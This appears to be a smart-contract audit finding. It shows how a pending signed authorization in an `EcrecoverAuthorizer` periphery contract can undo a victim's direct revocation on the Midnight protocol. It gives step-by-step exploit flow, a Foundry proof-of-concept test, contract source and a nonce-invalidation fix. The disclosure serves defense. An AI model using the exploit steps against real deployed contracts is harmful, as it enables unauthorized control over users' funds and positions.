### Title
Pending EcrecoverAuthorizer Signature Survives Direct Midnight Revocation — (`src/periphery/EcrecoverAuthorizer.sol`)

### Summary
`EcrecoverAuthorizer` maintains its own per-authorizer nonce that is only incremented by successful calls through `EcrecoverAuthorizer.setIsAuthorized`. A victim who revokes an attacker's authorization by calling `Midnight.setIsAuthorized` directly does not touch that nonce, leaving any pending (signed-but-not-yet-submitted) authorization signature valid. The attacker can then submit the pending signature to restore their authorization, defeating the revocation.

### Finding Description
**Code path:**

`EcrecoverAuthorizer.setIsAuthorized` ( [1](#0-0) ) checks two things before acting:

```
require(block.timestamp <= authorization.deadline, Expired());          // line 25
require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce()); // line 26
```

The nonce lives exclusively in `EcrecoverAuthorizer.nonce[authorizer]` and is only incremented here. [2](#0-1) 

`Midnight.setIsAuthorized` is a completely separate entry point: [3](#0-2) 

It writes `isAuthorized[onBehalf][authorized]` but has no knowledge of, and makes no change to, the `EcrecoverAuthorizer` nonce.

**Exploit flow (attacker-controlled inputs):**

1. Victim calls `Midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim)` — standard setup to use the periphery.
2. Victim signs `Authorization{authorizer: victim, authorized: attacker, isAuthorized: true, nonce: 0, deadline: block.timestamp + 365 days}` and shares it with the attacker (e.g., off-chain delegation, intercepted from mempool, or a previously issued but not-yet-submitted permit).
3. Attacker deliberately withholds the signature.
4. Victim decides to revoke and calls `Midnight.setIsAuthorized(attacker, false, victim)` directly. `isAuthorized[victim][attacker]` is now `false`. The `EcrecoverAuthorizer` nonce for `victim` is still `0`.
5. Attacker submits the withheld signature to `EcrecoverAuthorizer.setIsAuthorized`. Nonce check passes (`0 == 0`), deadline check passes, signature is valid. `EcrecoverAuthorizer` calls `Midnight.setIsAuthorized(attacker, true, victim)`. [4](#0-3) 
6. `isAuthorized[victim][attacker]` is `true` again. Revocation is undone.

**Why existing checks fail:**

The nonce prevents *true replay* of an already-consumed signature, but it does not help the victim invalidate a *pending* signature. There is no `invalidateNonce()` or equivalent function in `EcrecoverAuthorizer`. [5](#0-4)  The victim's only non-obvious escape is to also revoke `EcrecoverAuthorizer`'s own authorization in Midnight (`setIsAuthorized(ecrecoverAuthorizer, false, victim)`), but nothing in the protocol enforces or documents this as a required step, and a user who calls `Midnight.setIsAuthorized(attacker, false, victim)` has every reason to believe the revocation is complete.

### Impact Explanation
An attacker who holds any pending (signed, deadline-not-expired) `EcrecoverAuthorizer` authorization for `isAuthorized: true` can restore their own authorization at any time after the victim revokes it via the direct Midnight path. This gives the attacker persistent, victim-unrevocable access to all operations gated by `isAuthorized` (take on behalf, repay on behalf, setConsumed, setIsAuthorized chaining, etc.).

### Likelihood Explanation
Preconditions are realistic: off-chain delegation flows routinely produce signed-but-not-yet-submitted authorizations. The attacker only needs to withhold submission until after the victim's revocation transaction confirms, then submit. The attack is repeatable for every pending signature the attacker holds and is not blocked by any on-chain mechanism.

### Recommendation
Add an `invalidateNonce()` (or `incrementNonce()`) function to `EcrecoverAuthorizer` that the authorizer can call directly to advance their own nonce, burning all pending signatures at the current nonce:

```solidity
function invalidateNonce() external {
    nonce[msg.sender]++;
    emit NonceInvalidated(msg.sender, nonce[msg.sender]);
}
```

This mirrors the standard pattern used by EIP-2612 (`permit`) and Uniswap Permit2. Additionally, document that revoking via `Midnight.setIsAuthorized` directly does **not** invalidate pending `EcrecoverAuthorizer` signatures.

### Proof of Concept
```solidity
function testPendingSignatureSurvivesDirectRevocation() public {
    // Setup: victim authorizes EcrecoverAuthorizer
    vm.prank(victim);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);

    // Victim signs authorization for attacker (nonce=0, far deadline)
    Authorization memory auth = Authorization({
        authorizer: victim,
        authorized: attacker,
        isAuthorized: true,
        nonce: 0,
        deadline: block.timestamp + 365 days
    });
    Signature memory sig = signAuthorization(auth, victim); // attacker holds this

    // Victim revokes attacker directly on Midnight (does NOT touch EcrecoverAuthorizer nonce)
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, false, victim);
    assertEq(midnight.isAuthorized(victim, attacker), false);
    assertEq(ecrecoverAuthorizer.nonce(victim), 0); // nonce unchanged

    // Attacker submits the pending signature — should revert but does not
    ecrecoverAuthorizer.setIsAuthorized(auth, sig);

    // Assertion: authorization is restored despite victim's revocation
    assertEq(midnight.isAuthorized(victim, attacker), true); // BUG: revocation bypassed
}
```

Expected: the final `assertEq` should fail (authorization should remain `false`). Without the fix it passes, confirming the vulnerability.

```text
contract EcrecoverAuthorizer is IEcrecoverAuthorizer {
    address public immutable MIDNIGHT;
    mapping(address => uint256) public nonce;

    constructor(address _midnight) {
        MIDNIGHT = _midnight;
    }

    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
```
